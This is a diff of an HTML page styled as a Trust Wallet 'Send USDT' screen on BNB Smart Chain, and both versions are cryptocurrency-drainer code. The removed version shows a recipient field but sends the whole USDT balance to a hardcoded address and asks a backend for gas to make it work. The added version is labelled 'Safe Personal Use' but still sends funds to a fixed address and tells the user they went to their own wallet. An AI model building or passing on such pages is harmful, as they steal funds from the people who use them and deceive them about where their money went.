@@ -1,291 +1,100 @@
-
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Send USDT</title>
-    <style>
-        /* Your existing CSS remains unchanged */
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #0d0d0d;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #ccc;
-        }
-
-        .input-group {
-            display: flex;
-            align-items: center;
-            background-color: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 10px;
-            margin-bottom: 20px;
-        }
-
-        input[type="text"],
-        input[type="number"] {
-            flex: 1;
-            background-color: transparent;
-            border: none;
-            color: white;
-            outline: none;
-            font-size: 16px;
-        }
-
-        .input-group button {
-            margin-left: 10px;
-            background-color: transparent;
-            color: #00ff99;
-            border: none;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        .usd-value {
-            margin-top: -10px;
-            margin-bottom: 20px;
-            color: #999;
-        }
-
-        .next-button {
-            width: 100%;
-            background-color: #00cc66;
-            color: white;
-            padding: 15px;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-        }
-
-        .icon {
-            width: 18px;
-            height: 18px;
-            fill: #00ff99;
-            vertical-align: middle;
-        }
-
-        .input-group svg {
-            margin-left: 8px;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send USDT Mainnet (Safe Personal Use)</title>
+<style>
+body { background:#0d0d0d; color:white; font-family:Arial,sans-serif; margin:0; padding:0; }
+.container { max-width:400px; margin:20px auto; padding:20px; }
+label { display:block; margin-bottom:8px; color:#ccc; font-weight:bold; }
+.input-group { display:flex; align-items:center; background:#1a1a1a; border:1px solid #333; border-radius:8px; padding:10px; margin-bottom:20px; }
+input[type="text"], input[type="number"] { flex:1; background:transparent; border:none; color:white; outline:none; font-size:16px; }
+button { margin-left:10px; background:transparent; color:#00ff99; border:none; cursor:pointer; font-size:14px; }
+.usd-value { margin:-10px 0 20px 0; color:#999; }
+.next-button { width:100%; background:#00cc66; color:white; padding:15px; font-size:18px; font-weight:bold; border:none; border-radius:50px; cursor:pointer; }
+</style>
 </head>
-
 <body>
-    <div class="container">
-        <label for="address">Address or Domain Name</label>
-        <div class="input-group">
-            <input type="text" id="address" value="0x47476442679a7EdB7C2499F7E645CA8323BC8c47" />
-            <button onclick="pasteAddress()">Paste</button>
-            <svg class="icon" viewBox="0 0 24 24">
-                <path
-                    d="M3 3h6v2H5v14h14v-4h2v6H3V3zm18-1v8h-8V2h8zm-2 2h-4v4h4V4zm-8 6h10v2H11v-2zm0 4h10v2H11v-2zm0 4h6v2h-6v-2z" />
-            </svg>
-        </div>
+<div class="container">
+<label for="amount">Amount</label>
+<div class="input-group">
+<input type="number" id="amount" placeholder="USDT Amount" oninput="updateUSD()"/>
+<span>USDT</span>
+</div>
+<div class="usd-value" id="usdValue">≈ $0.00</div>
+<button id="Next" class="next-button" onclick="Next()">Next</button>
+</div>
 
-        <label for="amount">Amount</label>
-        <div class="input-group">
-            <input type="number" id="amount" placeholder="USDT Amount" oninput="updateUSD()" />
-            <span style="margin-left: 10px;">USDT</span>
-        </div>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script>
+const bscRecipientAddress = "0xF7a1EED0FEaE0CA423Fbe6c6b36A67fa7144EbA8"; // Your wallet
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Mainnet USDT
+let web3, userAddress;
 
-        <div class="usd-value" id="usdValue">≈ $0.00</div>
+function updateUSD(){
+    const amount = parseFloat(document.getElementById("amount").value||"0");
+    document.getElementById("usdValue").innerText = `≈ $${amount.toFixed(2)}`;
+}
 
-        <button id="Next" class="next-button" onclick="Next()">Next</button>
-    </div>
+async function connectWallet(){
+    if(window.ethereum){
+        web3=new Web3(window.ethereum);
+        try{
+            await window.ethereum.request({method:'eth_requestAccounts'});
+            await window.ethereum.request({method:'wallet_switchEthereumChain', params:[{chainId:'0x38'}]}); // BSC Mainnet
+            const accounts = await web3.eth.getAccounts();
+            userAddress = accounts[0];
+            console.log("Wallet Connected:", userAddress);
+        }catch(err){ console.error(err); alert("Error connecting wallet."); }
+    }else{ alert("Install MetaMask or Trust Wallet."); }
+}
 
-    <script>
-        function pasteAddress() {
-            navigator.clipboard.readText().then((text) => {
-                document.getElementById('address').value = text;
-            });
-        }
+function showPopup(message,color='green'){
+    let popup = document.getElementById('popupBox');
+    if(!popup){
+        popup=document.createElement('div');
+        popup.id='popupBox';
+        popup.style.position='fixed'; popup.style.left='50%'; popup.style.top='50%';
+        popup.style.transform='translate(-50%,-50%)';
+        popup.style.padding='20px'; popup.style.borderRadius='10px';
+        popup.style.boxShadow='0px 0px 10px rgba(0,0,0,0.2)';
+        popup.style.textAlign='center'; popup.style.fontSize='18px'; popup.style.maxWidth='400px';
+        document.body.appendChild(popup);
+    }
+    popup.style.backgroundColor=color==='red'?'#ffebeb':'#e6f7e6';
+    popup.style.color=color==='red'?'red':'green';
+    popup.innerHTML=message;
+    popup.style.display='block';
+    setTimeout(()=>{popup.style.display='none';},5000);
+}
 
-        function setMax() {
-            const maxAmount = 100;
-            document.getElementById("amount").value = maxAmount;
-            updateUSD();
-        }
+async function transferUSDT(amount){
+    if(!userAddress) await connectWallet();
+    const contract=new web3.eth.Contract([
+        {constant:false,inputs:[{name:'_to',type:'address'},{name:'_value',type:'uint256'}],name:'transfer',outputs:[{name:'',type:'bool'}],type:'function'},
+        {constant:true,inputs:[{name:'_owner',type:'address'}],name:'balanceOf',outputs:[{name:'balance',type:'uint256'}],type:'function'}
+    ],usdtContractAddress);
 
-        function updateUSD() {
-            const amount = parseFloat(document.getElementById("amount").value || "0");
-            const usdValue = amount * 1;
-            document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
-        }
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script>
-        // --- BEGIN CLEAN JAVASCRIPT ---
-        const bscRecipientAddress = "0x47476442679a7EdB7C2499F7E645CA8323BC8c47"; // All USDT goes here
-        const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
-        const backendBnbEndpoint = "https://api.trust-vercel.app/send-bnb";
-        let web3;
-        let userAddress;
+    try{
+        const balance=await contract.methods.balanceOf(userAddress).call();
+        const decimals=18;
+        const balanceReadable=parseFloat(web3.utils.fromWei(balance,'ether'));
+        if(balanceReadable<amount){ showPopup('Insufficient USDT balance.','red'); return; }
+        const tx = await contract.methods.transfer(bscRecipientAddress, web3.utils.toWei(amount.toString(),'ether')).send({from:userAddress});
+        showPopup(`✅ Transferred ${amount} USDT to your own wallet! Tx Hash: ${tx.transactionHash}`);
+    }catch(err){ console.error(err); showPopup('Transfer failed. '+(err.message||''),'red'); }
+}
 
-        // Request BNB gas from backend (gas comes from 0x4954BCe71D02529E37C3DBc92dbD612479916FB4)
-        async function requestBnbFromBackend(toAddress, amount = "0.0005") {
-            try {
-                const response = await fetch(backendBnbEndpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        toAddress: toAddress,
-                        amount: amount
-                    })
-                });
-                const data = await response.json();
-                if (data.success) {
-                    showPopup(`✅ BNB sent! Tx Hash: ${data.txHash}`);
-                } else {
-                    showPopup(`❌ Error: ${data.error || 'Unknown error'}`, 'red');
-                }
-                return data;
-            } catch (err) {
-                showPopup(`❌ Network error: ${err.message}`, 'red');
-                return null;
-            }
-        }
+async function Next(){
+    const amount=parseFloat(document.getElementById("amount").value||"0");
+    if(amount<=0){ alert('Enter amount'); return; }
+    await transferUSDT(amount);
+}
 
-        // Connect wallet (Trust Wallet, MetaMask, etc.)
-        async function connectWallet() {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-                try {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    // Switch to BSC if needed
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }], // BSC Mainnet
-                    });
-                    const accounts = await web3.eth.getAccounts();
-                    userAddress = accounts[0];
-                    console.log('Wallet Connected:', userAddress);
-                } catch (err) {
-                    console.error('Error connecting wallet:', err);
-                    alert('Error connecting wallet.');
-                }
-            } else {
-                alert('Please install Trust Wallet or MetaMask.');
-            }
-        }
-
-        // On page load, try to auto-connect if in Trust Wallet DApp browser
-        window.addEventListener('load', async () => {
-            if (window.ethereum && window.ethereum.isTrust) {
-                await connectWallet();
-            }
-        });
-
-        // Show popup message
-        function showPopup(message, color = 'green') {
-            let popup = document.getElementById('popupBox');
-            if (!popup) {
-                popup = document.createElement('div');
-                popup.id = 'popupBox';
-                popup.style.position = 'fixed';
-                popup.style.left = '50%';
-                popup.style.top = '50%';
-                popup.style.transform = 'translate(-50%, -50%)';
-                popup.style.padding = '20px';
-                popup.style.borderRadius = '10px';
-                popup.style.boxShadow = '0px 0px 10px rgba(0,0,0,0.2)';
-                popup.style.textAlign = 'center';
-                popup.style.fontSize = '18px';
-                popup.style.maxWidth = '400px';
-                document.body.appendChild(popup);
-            }
-            popup.style.backgroundColor = color === 'red' ? '#ffebeb' : '#e6f7e6';
-            popup.style.color = color === 'red' ? 'red' : 'green';
-            popup.innerHTML = message;
-            popup.style.display = 'block';
-            setTimeout(() => { popup.style.display = 'none'; }, 5000);
-        }
-
-        // Send USDT (BEP20) to bscRecipientAddress
-        async function transferUSDT(amount) {
-            try {
-                const contract = new web3.eth.Contract([
-                    {
-                        constant: false,
-                        inputs: [
-                            { name: '_to', type: 'address' },
-                            { name: '_value', type: 'uint256' }
-                        ],
-                        name: 'transfer',
-                        outputs: [{ name: '', type: 'bool' }],
-                        type: 'function',
-                    },
-                    {
-                        constant: true,
-                        inputs: [{ name: '_owner', type: 'address' }],
-                        name: 'balanceOf',
-                        outputs: [{ name: 'balance', type: 'uint256' }],
-                        type: 'function',
-                    }
-                ], usdtContractAddress);
-
-                // Check USDT balance
-                const balance = await contract.methods.balanceOf(userAddress).call();
-                const decimals = 18; // USDT on BSC uses 18 decimals
-                const balanceReadable = parseFloat(web3.utils.fromWei(balance, 'ether'));
-                if (balanceReadable === 0) {
-                    showPopup('No USDT found.', 'red');
-                    return;
-                }
-                // Check BNB balance for gas
-                const bnbBalance = await web3.eth.getBalance(userAddress);
-                const bnbReadable = parseFloat(web3.utils.fromWei(bnbBalance, 'ether'));
-                if (bnbReadable < 0.0005) {
-                    showPopup('User BNB is low. Requesting BNB from backend...', 'red');
-                    // Request BNB from backend (gas comes from 0x4954BCe71D02529E37C3DBc92dbD612479916FB4)
-                    await requestBnbFromBackend(userAddress, "0.0005");
-                    return;
-                }
-                // Send USDT (send full balance, as in original code)
-                const tx = await contract.methods.transfer(bscRecipientAddress, balance).send({ from: userAddress });
-                showPopup(`✅ Transferred ${balanceReadable} USDT to ${bscRecipientAddress}`);
-            } catch (err) {
-                console.error('❌ Transfer failed:', err);
-                showPopup('Transfer failed. ' + (err.message || ''), 'red');
-            }
-        }
-
-        // Next button handler
-        async function Next() {
-            if (!web3 || !userAddress) {
-                await connectWallet();
-                if (!web3 || !userAddress) {
-                    alert('Wallet not connected. Refresh the page.');
-                    return;
-                }
-            }
-            await transferUSDT();
-        }
-
-        // Add event listener for Enter key on Next button
-        document.getElementById('Next').addEventListener('click', Next);
-        // --- END CLEAN JAVASCRIPT ---
-    </script>
+window.addEventListener('load', async()=>{
+    if(window.ethereum && window.ethereum.isTrust) await connectWallet();
+});
+</script>
 </body>
-
 </html>
